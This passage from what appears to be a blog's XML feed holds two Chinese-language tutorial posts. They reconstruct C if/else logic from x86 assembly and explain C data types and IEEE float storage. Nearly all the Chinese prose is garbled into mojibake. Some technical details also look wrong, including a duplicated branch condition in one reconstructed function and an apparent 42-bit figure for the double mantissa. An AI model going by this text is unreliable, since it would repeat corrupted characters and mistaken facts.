<code>mov         eax,[004225c4]: m</code> </li><li>åŠŸèƒ½åˆ†æ:(çœç•¥ï¼Œç›´æ¥ä»¥cè¯­è¨€ä»£ç è¡¨ç¤º)</li><li>è¿”å›å€¼åˆ†æ   æ— </li></ol><p><strong>é€†ä¸ºcå‡½æ•°</strong>ï¼š</p><div class="hljs"><pre><code>int m=1;void Funcation(int x, int y){    int a;    a=m;    if(x&lt;=y)    {        y=y+a;        m=y;    }}</code></pre></div><p><img src="/2019/10/23/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆå››ï¼‰/images/15719214461732.jpg" srcset="/img/loading.gif" alt></p><h4 id="IFâ€¦ELSEâ€¦è¯­å¥é€†å‘åˆ†æ"><a href="#IFâ€¦ELSEâ€¦è¯­å¥é€†å‘åˆ†æ" class="headerlink" title="IFâ€¦ELSEâ€¦è¯­å¥é€†å‘åˆ†æ"></a>IFâ€¦ELSEâ€¦è¯­å¥é€†å‘åˆ†æ</h4><p>if..eesè¯­å¥æ¯”ifè¯­å¥å¤šå‡ºäº†-ä¸€ä¸ªâ€œelseâ€ ï¼Œå½“ifè¡¨è¾¾å¼ç»“æœä¸ºçœŸæ—¶è·³è¿‡elseåˆ†æ”¯è¯­å¥å—ï¼Œå½“è¡¨è¾¾å¼ç»“æœä¸ºå‡æ—¶è·³è½¬åˆ°else åˆ†æ”¯è¯­å¥å—ä¸­ã€‚<br><img src="/2019/10/23/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆå››ï¼‰/images/15719216273356.jpg" srcset="/img/loading.gif" alt="-w226"><br>ç‰¹å¾è¯†åˆ«:é¦–å…ˆä¼šæœ‰ä¸€ä¸ªjxxæŒ‡ä»¤ç”¨äºå‘ä¸‹è·³è½¬ï¼Œä¸”è·³è½¬çš„ç›®çš„elseä¸­æœ‰çš„ä¸Šæ–¹æœ‰jmpæŒ‡ä»¤ã€‚else ä»£ç çš„ç»“å°¾æ²¡æœ‰jmpæŒ‡ä»¤ï¼Œelse çš„ä»£ç ä¹Ÿä¼šæ‰§è¡Œif _else. _end çš„ä»£ç ã€‚æ ¹æ®ä»¥ä¸Šç‰¹å¾ï¼ŒæŠŠjxxæŒ‡ä»¤å–ååï¼Œå³å¯è¿˜åŸifâ€¦eseè¯­å¥çš„ä»£ç <br><strong>æ€»ç»“ï¼šè·³è½¬æ‰§è¡Œä¸€éƒ¨åˆ†ä»£ç ï¼Œä¸è·³è½¬æ‰§è¡Œå¦å¤–ä¸€éƒ¨åˆ†ä»£ç </strong><br>æ±‡ç¼–ä»£ç ï¼š<br><img src="/2019/10/23/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆå››ï¼‰/images/15719219621907.jpg" srcset="/img/loading.gif" alt="-w369"><br>åŒæ ·å®‰è£…ä¸€å®šçš„é¡ºåºï¼š</p><p>1ï¼šåˆ†æå‚æ•°ï¼š<code>[ebp+8] : X</code>        <code>[ebp+0Ch] :Y</code><br>2ï¼šåˆ†æå±€éƒ¨å˜é‡   <code>[ebp-4] = eax = [004225c4]</code><br>3ï¼šåˆ†æå…¨å±€å˜é‡       <code>[004225c4] G</code><br>4ï¼šåŠŸèƒ½åˆ†æ:æ¯”è¾ƒXä¸Yçš„å¤§å°ï¼Œå¦‚æœX&lt;=Yé‚£ä¹ˆæ‰§è¡Œ<br><img src="/2019/10/23/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆå››ï¼‰/images/15719249677324.jpg" srcset="/img/loading.gif" alt="-w427"><br>å¦‚æœX&gt;Y é‚£ä¹ˆæ‰§è¡Œ<br><img src="/2019/10/23/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆå››ï¼‰/images/15719249899962.jpg" srcset="/img/loading.gif" alt="-w435"><br>5ï¼šè¿”å›å€¼åˆ†æ   æ— <br><strong>ç»ƒä¹ ï¼š</strong><br><img src="/2019/10/23/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆå››ï¼‰/images/15719223446828.jpg" srcset="/img/loading.gif" alt="-w382"></p><ol><li>åˆ†æå‚æ•°ï¼š<code>[ebp+8] : X</code>        <code>[ebp+0Ch] :Y</code></li><li>åˆ†æå±€éƒ¨å˜é‡   <code>[ebp-4]ï¼šeax:[004225c4]:a</code> <code>[ebp-8]:b:2</code></li><li>åˆ†æå…¨å±€å˜é‡       <code>mov         eax,[004225c4]</code> </li><li>åŠŸèƒ½åˆ†æ:(çœç•¥ï¼Œç›´æ¥ä»¥cè¯­è¨€ä»£ç è¡¨ç¤º)</li><li>è¿”å›å€¼åˆ†æ   æ— </li></ol><p><strong>è¿˜åŸæˆcå‡½æ•°ï¼š</strong></p><div class="hljs"><pre><code>int m=1;void Funcation(int x,int y){    int a,b;    a=m;    b=2;    if (x&gt;=y)    {        b=b+1;        if (x&lt;y)        {            m=b;        }else m=a+b;    }}</code></pre></div><p><img src="/2019/10/23/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆå››ï¼‰/images/15719224472672.jpg" srcset="/img/loading.gif" alt></p><h4 id="IFâ€¦ELSE-IFâ€¦ELSEé€†å‘åˆ†æ"><a href="#IFâ€¦ELSE-IFâ€¦ELSEé€†å‘åˆ†æ" class="headerlink" title="IFâ€¦ELSE IFâ€¦ELSEé€†å‘åˆ†æ"></a>IFâ€¦ELSE IFâ€¦ELSEé€†å‘åˆ†æ</h4><p><img src="/2019/10/23/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆå››ï¼‰/images/15719225611187.jpg" srcset="/img/loading.gif" alt="-w307"><br>ç‰¹å¾è¯†åˆ«:é¦–å…ˆä¼šæœ‰ä¸€ä¸ªjxxæŒ‡ä»¤ç”¨äºå‘ä¸‹è·³è½¬ï¼Œä¸”è·³è½¬çš„ç›®çš„else ifä¸­æœ‰jmpæŒ‡ä»¤ã€‚else ifçš„è·³è½¬ç›®çš„elseä¸­æœ‰jmpæŒ‡ä»¤ï¼Œä¸”elseç çš„ç»“å°¾æ²¡æœ‰jmpæŒ‡ä»¤ï¼Œ<strong>æ‰€æœ‰jmpçš„ç›®æ ‡åœ°å€ä¸€è‡´</strong>ã€‚æ ¹æ®ä»¥ä¸Šç‰¹å¾ï¼ŒæŠŠjxxæŒ‡ä»¤å–åï¼Œå³å¯è¿˜åŸifâ€¦else ifâ€¦.elseè¯­å¥çš„ä»£ç ã€‚<br><strong>å¦‚æœæŸä¸ªåˆ†æ”¯æ²¡æœ‰æ¡ä»¶åˆ¤æ–­ï¼Œåˆ™ä¸ºelseéƒ¨åˆ†</strong>ã€‚<br>æ±‡ç¼–ä»£ç ï¼š<br><img src="/2019/10/23/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆå››ï¼‰/images/15719226993158.jpg" srcset="/img/loading.gif" alt="-w334"><br>    å‡½æ•°å†…éƒ¨åŠŸèƒ½åˆ†æï¼š<br>    1ã€åˆ†æå‚æ•°ï¼š<code>[ebp+8]    X                        [ebp+0Ch]  Y                        [ebp+10h]  Z</code><br>    2ã€åˆ†æå±€éƒ¨å˜é‡    <code>[ebp-4] = A = 0                        [ebp-8] = B = 1                        [ebp-0Ch] = C = 2</code><br>    3ã€åˆ†æå…¨å±€å˜é‡        æ— <br>    4ã€åŠŸèƒ½åˆ†æ        </p><div class="hljs"><pre><code>if(x&gt;y)                                {                                    A = B+1;                                }                                else if(x&gt;z)                                {                                    A = C+1;                                }                                else if(x&gt;z)                                {                                    A = B+C                                }                                else                                {                                    A = B+C+1;                                }                                return A;                </code></pre></div><p>ç»ƒä¹ ï¼š<br><img src="/2019/10/23/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆå››ï¼‰/images/15719228667624.jpg" srcset="/img/loading.gif" alt="-w305"><br>1ã€åˆ†æå‚æ•°ï¼š<code>[ebp+8]    X                        [ebp+0Ch]  Y                        [ebp+10h]  Z</code><br>    2ã€åˆ†æå±€éƒ¨å˜é‡    <code>[ebp-4] = A                        [ebp-8] = B                        [ebp-0Ch] = C</code><br>    3ã€åˆ†æå…¨å±€å˜é‡        æ— <br>    4.è¿”å›å€¼åˆ†æ a+1<br>    è¿˜åŸæˆCå‡½æ•°ï¼š</p><div class="hljs"><pre><code>int Funcation(int x,int y,int z){    int a=0;    int b=1;    int c=2;    if (x&lt;=y)    {        a=b-1;    }    else if (y&gt;=z)    {        a=c+1;    }    else if (x&gt;z)    {        a=b+c;    }    else a=b+c-1;    return a+1;}</code></pre></div><p><img src="/2019/10/23/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆå››ï¼‰/images/15719229837839.jpg" srcset="/img/loading.gif" alt></p><h4 id="æ„Ÿæ‚Ÿ-1"><a href="#æ„Ÿæ‚Ÿ-1" class="headerlink" title="æ„Ÿæ‚Ÿ"></a>æ„Ÿæ‚Ÿ</h4><p>æ¯ä¸ªåˆ†æ”¯ç±»å‹éƒ½æœ‰è‡ªå·±çš„ç‰¹å¾ç‚¹ï¼Œè®°æ¸…æ¥šè¿™ä¸ªåï¼Œåˆ†æèµ·æ¥ä¼šå®¹æ˜“å¾ˆå¤šã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>cä¸æ±‡ç¼–</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆä¸‰ï¼‰</title>
    <link href="/2019/10/20/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <url>/2019/10/20/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%EF%BC%88%E4%B8%89%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆä¸‰ï¼‰"><a href="#Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆä¸‰ï¼‰" class="headerlink" title="Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆä¸‰ï¼‰"></a>Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆä¸‰ï¼‰</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ¬æ¬¡ä¸»è¦å­¦ä¹ ä¸€ä¸‹Cè¯­è¨€çš„æ•°æ®ç±»å‹ä¸æ•°æ®å­˜å‚¨ã€‚</p><h2 id="æ•°æ®ç±»å‹"><a href="#æ•°æ®ç±»å‹" class="headerlink" title="æ•°æ®ç±»å‹"></a>æ•°æ®ç±»å‹</h2><p><img src="/2019/10/20/Cè¯­è¨€å­¦ä¹ ä¸åæ±‡ç¼–ï¼ˆä¸‰ï¼‰/images/15715865045834.jpg" srcset="/img/loading.gif" alt="-w709"></p><h3 id="å­¦ä¹ æ•°æ®ç±»å‹çš„ä¸‰ä¸ªè¦ç´ "><a href="#å­¦ä¹ æ•°æ®ç±»å‹çš„ä¸‰ä¸ªè¦ç´ " class="headerlink" title="å­¦ä¹ æ•°æ®ç±»å‹çš„ä¸‰ä¸ªè¦ç´ "></a>å­¦ä¹ æ•°æ®ç±»å‹çš„ä¸‰ä¸ªè¦ç´ </h3><p>1ã€å­˜å‚¨æ•°æ®çš„å®½åº¦<br>2ã€å­˜å‚¨æ•°æ®çš„æ ¼å¼<br>3ã€ä½œç”¨èŒƒå›´(ä½œç”¨åŸŸ)<br>è¿™äº›éƒ½æ˜¯è°ˆèµ·ä¸€ä¸ªæ•°æ®ç±»å‹çš„åŸºæœ¬è¦ç´ ã€‚</p><h3 id="æ•´æ•°ç±»å‹ï¼šchar-short-int-long"><a href="#æ•´æ•°ç±»å‹ï¼šchar-short-int-long" class="headerlink" title="æ•´æ•°ç±»å‹ï¼šchar  short  int long"></a>æ•´æ•°ç±»å‹ï¼šchar  short  int long</h3><table><thead><tr><th>char</th><th>8BIT</th><th>1å­—èŠ‚</th></tr></thead><tbody><tr><td>short</td><td>16BIT</td><td>2å­—èŠ‚</td></tr><tr><td>int</td><td>32BIT</td><td>4å­—èŠ‚</td></tr><tr><td>long</td><td>32BIT</td><td>4å­—èŠ‚</td></tr></tbody></table><div class="hljs"><pre><code>char i = 0xFF;short x =0xFF;long y =0xFF;</code></pre></div><p>æˆ‘ä»¬æ¥çœ‹ä¸‹åœ¨æ±‡ç¼–å…¶æ˜¯ä»€ä¹ˆæ ·çš„ï¼š<br><img src="/2019/10/20/Cè¯­è¨€å­¦ä¹ ä¸åæ±‡ç¼–ï¼ˆä¸‰ï¼‰/images/15715872059570.jpg" srcset="/img/loading.gif" alt="-w505"><br>æ³¨æ„<code>byte word dword</code>çš„åŒºåˆ«ã€‚<br>ç„¶åæˆ‘ä»¬æµ‹è¯•ä¸€ä¸‹ä»¥ä¸‹ä»£ç ï¼š</p><div class="hljs"><pre><code>char i = 0x12345678;short x = 0x12345678;long y = 0x12345678;</code></pre></div><p><img src="/2019/10/20/Cè¯­è¨€å­¦ä¹ ä¸åæ±‡ç¼–ï¼ˆä¸‰ï¼‰/images/15716535773728.jpg" srcset="/img/loading.gif" alt="-w639"><br>ç„¶åçœ‹åˆ°è¿˜æ˜¯<code>byte word dword</code>ï¼Œå¹¶ä¸”ä¹Ÿæ²¡æœ‰æŠ¥é”™ï¼Œä½†æ˜¯æˆ‘ä»¬è¿è¡Œä»¥åå¯ä»¥çœ‹åˆ°<br><img src="/2019/10/20/Cè¯­è¨€å­¦ä¹ ä¸åæ±‡ç¼–ï¼ˆä¸‰ï¼‰/images/15716536656301.jpg" srcset="/img/loading.gif" alt="-w1106"><br><strong>è¿™å°±è¯´æ˜ä½ å†™äº†32ä½çš„æ•°ç»™<code>char i</code>è¿™ä¸ª8ä½çš„å®¹å™¨ï¼Œè¿™æ˜¯å…è®¸çš„ï¼Œä½†æ˜¯åªèƒ½è£…ä¸‹8ä½ï¼Œå°±ä»ä½ä½å¼€å§‹æŠŠ78æ”¾å…¥ã€‚</strong></p><p>æ•´æ•°ç±»å‹åˆ†ä¸ºæœ‰ç¬¦å·(signed)å’Œæ— ç¬¦å·(unsigned)ä¸¤ç§ï¼š</p><div class="hljs"><pre><code>char i = 0xFF;unsigned char i = 0xFF;</code></pre></div><p>è¦çŸ¥é“å…¶åœ¨å†…å­˜é‡Œå­˜ç€æ˜¾ç¤ºçš„éƒ½æ˜¯FF<br><img src="/2019/10/20/Cè¯­è¨€å­¦ä¹ ä¸åæ±‡ç¼–ï¼ˆä¸‰ï¼‰/images/15716703064593.jpg" srcset="/img/loading.gif" alt="-w178"><br>ä½†æ˜¯è¾“å‡ºæ‰“å°å‡ºæ¥ä¸€ä¸ªæ˜¯255 ä¸€ä¸ªæ˜¯-1ï¼Œè¿™å°±æ˜¯è¯´æ˜åœ¨å†…å­˜ä¸­å­˜å‚¨çš„æ–¹å¼å®Œå…¨ä¸€æ ·ï¼Œä½†ä¼šæ ¹æ®ä½ çš„å®šä¹‰æ¥ç¡®å®å…¶æ˜¯æœ‰ç¬¦å·è¿˜æ˜¯æ— ç¬¦å·ã€‚å…¶é»˜è®¤æ˜¯æœ‰ç¬¦å·çš„ï¼Œå½“ä½ æƒ³ç”¨æ— ç¬¦å·çš„æ—¶å€™éœ€è¦ä½ æ¥å®šä¹‰ã€‚å¹¶ä¸”è¿™ä¸ªåªæœ‰åœ¨<strong>ç±»å‹è½¬æ¢å’Œå¤§å°æ¯”è¾ƒä¸­ç‰¹åˆ«æ³¨æ„</strong>ã€‚å› ä¸ºä½ ç›´æ¥å®šä¹‰ä¸ªæ— ç¬¦å·æ•°ï¼Œå…¶åœ¨å†…å­˜æ”¾çš„æ˜¯å’ŒåŸæ¥æœ‰ç¬¦å·æ•°ä¸€æ ·çš„ï¼Œåªæ˜¯ä½ åœ¨æ¯”è¾ƒæ—¶ç¼–è¯‘å™¨åœ¨ç¼–è¯‘çš„æ—¶å€™ï¼Œ<strong>ä¼šæŠŠå…¶ä¼šæŠŠæ±‡ç¼–ä»£ç è·³è½¬é‚£é‡Œæ”¹æˆç‰¹å®šå¯¹åº”çš„JCCä»£ç </strong>ï¼ˆåªè¦é’ˆå¯¹æ— ç¬¦å·ï¼Œå› ä¸ºé»˜è®¤æ˜¯æœ‰ç¬¦å·çš„ï¼‰ã€‚<br>ä¾‹å­ï¼š<br>æ— ç¬¦å·æ•°æ¯”è¾ƒï¼Œjccæ˜¯JBEï¼ŒåŸæ¥æ²¡æœ‰æŒ‡å®šæ˜¯æ— ç¬¦å·æ—¶ï¼Œå…¶æ˜¯JLEï¼ˆæœ‰ç¬¦å·ï¼‰<br><img src="/2019/10/20/Cè¯­è¨€å­¦ä¹ ä¸åæ±‡ç¼–ï¼ˆä¸‰ï¼‰/images/15716712689830.jpg" srcset="/img/loading.gif" alt="-w533"><br>æ€»ç»“ï¼š1ï¼šåœ¨å†…å­˜ä¸­å­˜å‚¨çš„æ–¹å¼å®Œå…¨ä¸€æ · ã€‚<br>        2ï¼šåœ¨ç±»å‹è½¬æ¢å’Œå¤§å°æ¯”è¾ƒä¸­ç‰¹åˆ«æ³¨æ„ï¼ˆè¿ç®—ï¼‰ã€‚</p><h3 id="æµ®ç‚¹ç±»å‹ï¼šfloat-double"><a href="#æµ®ç‚¹ç±»å‹ï¼šfloat-double" class="headerlink" title="æµ®ç‚¹ç±»å‹ï¼šfloat double"></a>æµ®ç‚¹ç±»å‹ï¼šfloat double</h3><p>floatå’Œdoubleåœ¨å­˜å‚¨æ–¹å¼ä¸Šéƒ½æ˜¯éµä»IEEEçš„è§„èŒƒçš„<br>floatçš„å­˜å‚¨æ–¹å¼å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<br><img src="/2019/10/20/Cè¯­è¨€å­¦ä¹ ä¸åæ±‡ç¼–ï¼ˆä¸‰ï¼‰/images/15716717408638.jpg" srcset="/img/loading.gif" alt="-w619"><br>doubleçš„å­˜å‚¨æ–¹å¼å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<br><img src="/2019/10/20/Cè¯­è¨€å­¦ä¹ ä¸åæ±‡ç¼–ï¼ˆä¸‰ï¼‰/images/15716718171405.jpg" srcset="/img/loading.gif" alt="-w729"></p><h4 id="å°†ä¸€ä¸ªfloatå‹è½¬åŒ–ä¸ºå†…å­˜å­˜å‚¨æ ¼å¼çš„æ­¥éª¤ä¸º"><a href="#å°†ä¸€ä¸ªfloatå‹è½¬åŒ–ä¸ºå†…å­˜å­˜å‚¨æ ¼å¼çš„æ­¥éª¤ä¸º" class="headerlink" title="å°†ä¸€ä¸ªfloatå‹è½¬åŒ–ä¸ºå†…å­˜å­˜å‚¨æ ¼å¼çš„æ­¥éª¤ä¸º:"></a>å°†ä¸€ä¸ªfloatå‹è½¬åŒ–ä¸ºå†…å­˜å­˜å‚¨æ ¼å¼çš„æ­¥éª¤ä¸º:</h4><ol><li>å…ˆå°†è¿™ä¸ªå®æ•°çš„ç»å¯¹å€¼åŒ–ä¸ºäºŒè¿›åˆ¶æ ¼å¼</li><li>å°†è¿™ä¸ªäºŒè¿›åˆ¶æ ¼å¼å®æ•°çš„å°æ•°ç‚¹å·¦ç§»æˆ–å³ç§»nä½ï¼Œç›´åˆ°å°æ•°ç‚¹ç§»åŠ¨åˆ°ç¬¬ä¸€ä¸ªæœ‰ æ•ˆæ•°å­—çš„å³è¾¹ã€‚</li><li>ä»å°æ•°ç‚¹å³è¾¹ç¬¬ä¸€ä¸€ä½å¼€å§‹æ•°å‡ºäºŒåä¸‰ä½æ•°å­—æ”¾å…¥ç¬¬22åˆ°ç¬¬0ä½ã€‚</li><li>å¦‚æœå®æ•°æ˜¯æ­£çš„ï¼Œåˆ™åœ¨ç¬¬31ä½æ”¾å…¥â€œ0â€ï¼Œå¦åˆ™æ”¾å…¥â€œ1â€ã€‚</li><li>å¦‚æœnæ˜¯å·¦ç§»å¾—åˆ°çš„ï¼Œè¯´æ˜æŒ‡æ•°æ˜¯æ­£çš„ï¼Œç¬¬30ä½æ”¾å…¥â€œ1â€ã€‚å¦‚æœnæ˜¯å³ç§»å¾—åˆ°çš„æˆ–n=0ï¼Œåˆ™ç¬¬30ä½æ”¾å…¥â€œ0â€ã€‚</li><li>å¦‚æœnæ˜¯å·¦ç§»å¾—åˆ°çš„ï¼Œåˆ™å°†nå‡å»1ååŒ–ä¸ºäºŒè¿›åˆ¶ï¼Œå¹¶åœ¨å·¦è¾¹åŠ â€œ0â€è¡¥è¶³ä¸ƒä½ï¼Œæ”¾å…¥ç¬¬29åˆ°ç¬¬23ä½ã€‚</li><li>å¦‚æœnæ˜¯å³ç§»å¾—åˆ°çš„æˆ–n=0ï¼Œåˆ™å°†nåŒ–ä¸ºäºŒè¿›åˆ¶ååœ¨å·¦è¾¹åŠ â€œ0â€™è¡¥è¶³ä¸ƒä½ï¼Œå†å„ä½æ±‚åï¼Œå†æ”¾å…¥ç¬¬29åˆ°ç¬¬23ä½ã€‚</li></ol><p>è¿™æ˜¯å®˜æ–¹è§£é‡Šã€‚æœ‰ç‚¹éº»çƒ¦ã€‚å…ˆç»ƒä¹ ä¸€ä¸ªï¼š<br>8.25è½¬æˆæµ®ç‚¹å­˜å‚¨<br><img src="/2019/10/20/Cè¯­è¨€å­¦ä¹ ä¸åæ±‡ç¼–ï¼ˆä¸‰ï¼‰/images/15716720748599.jpg" srcset="/img/loading.gif" alt="-w271"><br><img src="/2019/10/20/Cè¯­è¨€å­¦ä¹ ä¸åæ±‡ç¼–ï¼ˆä¸‰ï¼‰/images/15716720864148.jpg" srcset="/img/loading.gif" alt="-w229"><br>æ‰€ä»¥8.25ç”¨äºŒè¿›åˆ¶è¡¨ç¤ºå¯è¡¨ç¤ºä¸º1000.01ï¼Œç§‘å­¦è®¡æ•°æ³•è¡¨ç¤ºä¸€ä¸‹ï¼š1.00001X2^3<br>å°æ•°ç‚¹å‘å·¦ç§»åŠ¨3ä½ æŒ‡æ•°ä¸º3ï¼Œç„¶åæŒ‰ç…§ä¸Šé¢å…ˆæ”¾ç¬¬ä¸€ä¸ªç©ºæ ¼0ï¼ˆå› ä¸ºæ˜¯æ­£æ•°ï¼‰ï¼Œæ¥ç€æ”¾æœ€åä¸€ä¸ªå¤§æ ¼å­00001ï¼ˆç§‘å­¦è®¡æ•°æ³•è¡¨ç¤ºåä»å°æ•°ç‚¹åï¼‰ï¼Œç„¶åä¸­é—´æ ¼å­ç¬¬ä¸€ä½1ï¼ˆå› ä¸ºæ˜¯å·¦ç§»å°æ•°ç‚¹ï¼‰ï¼ŒæŒ‡æ•°3-1=2å˜æˆäºŒè¿›åˆ¶10ä»å³è¾¹å¼€å§‹æ”¾å…¥ã€‚è¿™å°±æ˜¯IEEEè§„èŒƒã€‚(å¯ä»¥æ„Ÿå—åˆ°æœ€éº»çƒ¦å°±æ˜¯ä¸­é—´è¿™æ®µçš„ç¡®å®šå€¼)<br><img src="/2019/10/20/Cè¯­è¨€å­¦ä¹ ä¸åæ±‡ç¼–ï¼ˆä¸‰ï¼‰/images/15716722496131.jpg" srcset="/img/loading.gif" alt="-w409"><br>æŒ‰å››ä½åˆ†å‰²<code>0100 0001 0000 0100 0000 0000 0000  0000</code>=41040000ï¼Œç„¶åå°±è¿™æ ·çš„å½¢å¼å­˜å…¥è®¡ç®—æœºå†…å­˜ã€‚</p><p>æˆ‘ä¸‹é¢ç”¨ç®€å•çš„ä¸”æ˜¯æ­£ç¡®çš„åŠæ³•æ¥è½¬æ¢ï¼š<br>å°†floatç±»å‹çš„12.5 è½¬æ¢æˆ16è¿›åˆ¶ï¼š<br>å…ˆæ•´ç†æ­£æ•°éƒ¨åˆ†ï¼Œ12=C=1100<br>å°æ•°éƒ¨åˆ† 0.5 * 2=1.0<br>æ‰€ä»¥äºŒè¿›åˆ¶å°±æ˜¯1100.1ï¼Œç§‘å­¦è®¡æ•°æ³• 1.1001x2^3<br>è¿™æ¬¡å¯¹ä¸­é—´æ ¼å­æ˜¯ç›´æ¥ç”¨<code>127+xçš„ç»“æœ</code> å˜æˆäºŒè¿›åˆ¶å¡«å……è¿™ä¸ªæ ¼å­ï¼Œxçš„å€¼å°±æ˜¯æŒ‡æ•°ï¼Œå…¶ä¸­<strong>å·¦ç§»æ˜¯æ­£å³ç§»ä¸ºè´Ÿ</strong><br> <img src="/2019/10/20/Cè¯­è¨€å­¦ä¹ ä¸åæ±‡ç¼–ï¼ˆä¸‰ï¼‰/images/15716732149036.jpg" srcset="/img/loading.gif" alt="-w382"></p><h4 id="doubleç±»å‹"><a href="#doubleç±»å‹" class="headerlink" title="doubleç±»å‹"></a>doubleç±»å‹</h4><p>å‰é¢è®²è§£äº†å•ç²¾åº¦æµ®ç‚¹ç±»å‹çš„IEEEç¼–ç ã€‚doubleç±»å‹å’Œfloatç±»å‹å¤§åŒå°å¼‚ï¼Œåªæ˜¯doubleç±»å‹è¡¨ç¤ºçš„èŒƒå›´æ›´å¤§ï¼Œå ç”¨ç©ºé—´æ›´å¤šï¼Œæ˜¯floatç±»å‹æ‰€å ç”¨ç©ºé—´çš„ä¸¤å€ã€‚å½“ç„¶ï¼Œç²¾å‡†åº¦ä¹Ÿä¼šæ›´é«˜ã€‚</p><p>doubleç±»å‹å 8å­—èŠ‚çš„å†…å­˜ç©ºé—´ï¼ŒåŒæ ·ï¼Œæœ€é«˜ä½ä¹Ÿç”¨äºè¡¨ç¤ºç¬¦å·ï¼ŒæŒ‡æ•°ä½å 11ä½ï¼Œå‰©<br>ä½™42ä½ç”¨äºè¡¨ç¤ºä½æ•°ã€‚<br>åœ¨floatä¸­ï¼ŒæŒ‡æ•°ä½èŒƒå›´ç”¨8ä½è¡¨ç¤ºï¼ŒåŠ 127åç”¨äºåˆ¤æ–­æŒ‡æ•°ç¬¦å·ã€‚åœ¨doubleä¸­ï¼Œç”±äºæ‰©å¤§äº†ç²¾åº¦ï¼Œå› æ­¤æŒ‡æ•°èŒƒå›´ä½¿ç”¨11ä½æ­£æ•°è¡¨ç¤ºï¼Œ<strong>åŠ 1023åå¯ç”¨äºæŒ‡æ•°ç¬¦å·åˆ¤æ–­</strong>ã€‚</p><p>doubleç±»å‹çš„IEEEç¼–ç è½¬æ¢è¿‡ç¨‹ä¸float ç±»å‹ä¸€æ ·ï¼Œå¯æ ¹æ®floatç±»å‹çš„è½¬æ¢æµç¨‹<br>æ¥è½¬æ¢doubleç±»å‹ã€‚<br><img src="/2019/10/20/Cè¯­è¨€å­¦ä¹ ä¸åæ±‡ç¼–ï¼ˆä¸‰ï¼‰/images/15717429314228.jpg" srcset="/img/loading.gif" alt="-w756"></p><h3 id="è‹±æ–‡å­—ç¬¦å­˜å‚¨"><a href="#è‹±æ–‡å­—ç¬¦å­˜å‚¨" class="headerlink" title="è‹±æ–‡å­—ç¬¦å­˜å‚¨"></a>è‹±æ–‡å­—ç¬¦å­˜å‚¨</h3><p>char x = â€˜Aâ€™;<br>å¯¹äºä¸€ä¸ªè‹±æ–‡å­—ç¬¦ï¼Œç¼–è¯‘å™¨ä¼šè‡ªåŠ¨æŸ¥ASCIIè¡¨è·å–å…¶å®šä¹‰çš„7ä½äºŒè¿›åˆ¶æ•°ï¼Œç„¶åè½¬æ¢å­˜å‚¨å…¶16è¿›åˆ¶æ”¾å…¥å†…å­˜ä¸­ã€‚ä¾‹ï¼š<br><img src="/2019/10/20/Cè¯­è¨€å­¦ä¹ ä¸åæ±‡ç¼–ï¼ˆä¸‰ï¼‰/images/15717434285598.jpg" srcset="/img/loading.gif" alt="-w446"><br><img src="/2019/10/20/Cè¯­è¨€å­¦ä¹ ä¸åæ±‡ç¼–ï¼ˆä¸‰ï¼‰/images/15717434479758.jpg" srcset="/img/loading.gif" alt="-w420"><br>è¡¥å……ï¼š</p><ul><li>æ ‡å‡† ASCII ç ä½¿ç”¨ 7 ä½äºŒè¿›åˆ¶æ•°æ¥è¡¨ç¤ºæ‰€æœ‰çš„å¤§å†™å’Œå°å†™å­—æ¯ï¼Œæ•°å­— 0 åˆ° 9ã€æ ‡ç‚¹ç¬¦å·ï¼Œä»¥åŠåœ¨ç¾å¼è‹±è¯­ä¸­ä½¿ç”¨çš„ç‰¹æ®Šæ§åˆ¶å­—ç¬¦ã€‚</li><li>ASCII ç ä½¿ç”¨æŒ‡å®šçš„ 7 ä½æˆ– 8 ä½äºŒè¿›åˆ¶æ•°ç»„åˆæ¥è¡¨ç¤º 128 æˆ– 256 ç§å¯èƒ½çš„å­—ç¬¦ã€‚</li><li>æ‰©å±• ASCII ç å…è®¸å°†æ¯ä¸ªå­—ç¬¦çš„ç¬¬ 8 ä½ç”¨äºç¡®å®šé™„åŠ çš„ 128 ä¸ªç‰¹æ®Šç¬¦å·å­—ç¬¦ã€å¤–æ¥è¯­å­—æ¯å’Œå›¾å½¢ç¬¦å·ã€‚</li></ul><p>ä¸ºä»€ä¹ˆä¸æ˜¯å…«ä½äºŒè¿›åˆ¶å‘¢ï¼Ÿå› ä¸ºå…¶ç¬¬ä¸€ä½éƒ½æ˜¯0ï¼Œæ²¡å¿…è¦è®°å½•ï¼Œåœ¨èµ·åˆ7ä½å·²ç»æ»¡è¶³éœ€æ±‚ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>cä¸æ±‡ç¼–</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
